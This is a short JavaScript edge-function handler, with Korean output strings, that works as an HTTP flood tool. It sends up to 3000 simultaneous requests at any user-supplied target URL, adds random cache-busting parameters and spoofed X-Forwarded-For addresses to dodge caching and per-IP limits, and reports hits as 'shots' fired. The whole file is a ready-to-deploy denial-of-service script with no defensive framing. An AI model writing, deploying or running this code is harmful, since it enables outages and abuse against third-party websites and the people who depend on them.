export const config = { runtime: 'edge' };

export default async function handler(req) {
    const url = new URL(req.url);
    const target = url.searchParams.get('target');
    const count = Math.min(parseInt(url.searchParams.get('count') || '100'), 3000);
    
    if (!target) return new Response("TARGET 없음");
    
    const promises = [];
    for (let i = 0; i < count; i++) {
        const randUrl = target + (target.includes('?') ? '&' : '?') + '_=' + Math.random() + Date.now();
        promises.push(fetch(randUrl, { 
            headers: { 'X-Forwarded-For': Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255) },
            cache: 'no-store' 
        }).catch(() => null));
    }
    
    const results = await Promise.allSettled(promises);
    const success = results.filter(r => r.status === 'fulfilled' && r.value?.ok !== false).length;
    
    return new Response(`${count}발 중 ${success}발 성공 / ${count-success}발 실패`);
}
